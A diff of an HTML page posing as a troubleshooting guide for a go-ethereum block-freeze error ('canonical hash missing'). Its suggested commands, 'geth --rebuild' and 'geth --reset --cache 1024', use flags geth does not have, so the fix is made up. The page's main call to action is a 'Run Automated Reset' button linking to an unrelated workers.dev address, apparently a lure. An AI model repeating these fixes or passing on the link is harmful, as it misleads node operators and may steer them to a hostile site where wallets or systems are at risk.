@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,27 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "canonical hash missing, can't freeze block" error message while attempting to freeze a block using Go Ethereum.</li>
+<li>The user encounters a "go-ethereum Error in block freeze operation" with a specific error message: "err='canonical hash missing, can't freeze block'". This indicates an issue with the block freeze operation due to a missing canonical hash.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when the Ethereum node is unable to retrieve the canonical hash of a block, which is necessary for the freeze operation. The canonical hash is a unique identifier for a block in the Ethereum blockchain, and its absence prevents the node from verifying the block's integrity.</li>
+<li>The error occurs because the Ethereum node is unable to find the canonical hash for a particular block, which is required for the block freeze operation. This can happen due to a corrupted or incomplete blockchain dataset, or if the node is not fully synchronized with the Ethereum network.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Check the node's blockchain data for inconsistencies or corruption.</li>
-<li>Verify the node's configuration to ensure it is properly connected to the Ethereum network.</li>
-<li>Run the following command to attempt to rebuild the blockchain index:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Verify the node's blockchain data integrity by checking for any corrupted files or incomplete downloads.</li>
+<li>Attempt to resynchronize the node with the Ethereum network to ensure it has the latest blockchain data.</li>
+<li>Use the following command to reset the node's blockchain data:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--rebuild
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--reset<span class="w"> </span>--cache<span class="w"> </span><span class="m">1024</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and troubleshooting.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and configuration options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A fully synced Ethereum node</li>
-<li>The latest version of Go Ethereum installed</li>
-<li>A stable internet connection for node synchronization</li>
+<li>A fully synchronized Ethereum node</li>
+<li>A stable and reliable network connection</li>
+<li>Sufficient disk space to store the Ethereum blockchain data</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
